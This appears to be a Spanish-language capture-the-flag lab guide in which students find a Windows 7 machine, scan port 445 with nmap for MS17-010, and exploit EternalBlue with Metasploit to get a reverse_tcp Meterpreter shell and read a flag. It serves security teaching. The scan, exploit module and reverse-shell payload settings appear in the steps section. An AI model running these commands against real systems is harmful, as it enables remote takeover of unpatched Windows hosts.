# Laboratorio ETERNAL BLUE

Este laboratorio pone a prueba la capacidad del alumno para identificar servicios vulnerables en sistemas Windows y explotar la vulnerabilidad **EternalBlue (MS17-010)** mediante Metasploit. A través de este reto, los alumnos lograrán comprender:

- Cómo detectar servicios SMB expuestos en la red.
- Uso de `nmap` para escaneo de vulnerabilidades con scripts NSE.
- Explotación de EternalBlue mediante el módulo de Metasploit.
- Obtención de acceso remoto mediante sesión `Meterpreter`.
- Lectura de flags en el escritorio de un usuario Windows.



## Especificaciones de la máquina 🖥️

- **Sistema:** Windows 7
- **Hostname:** ETERNAL-BLUE
- **Servicios activos:**
  - 445 (SMB)

- **Fondo de escritorio:** Imagen personalizada de usuario común
- **Nombre de usuario:** `user1` (puede personalizarse)
- **Flag:** `C:\Users\user1\Desktop\flag.txt`

## Pasos esperados por el alumno

1. Descubrir la IP de la máquina. Herramientas recomendadas: `nmap`, `netdiscover` o `arp-scan`.


2. Escanear el puerto 445 y detectar la vulnerabilidad MS17-010. Comando sugerido:

    ```bash
    nmap -p 445 --script smb-vuln-ms17-010 <IP>
    ```

3. Cargar y configurar el exploit en Metasploit. Módulo a utilizar:

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

    Parámetros típicos:

        ```bash
        set RHOSTS <IP>
        set LHOST <IP_local>
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        run
        ```

4. Obtener una sesión Meterpreter. Validar acceso con:

    ```bash
    getuid
    ```

5. Navegar al escritorio del usuario y leer la flag.
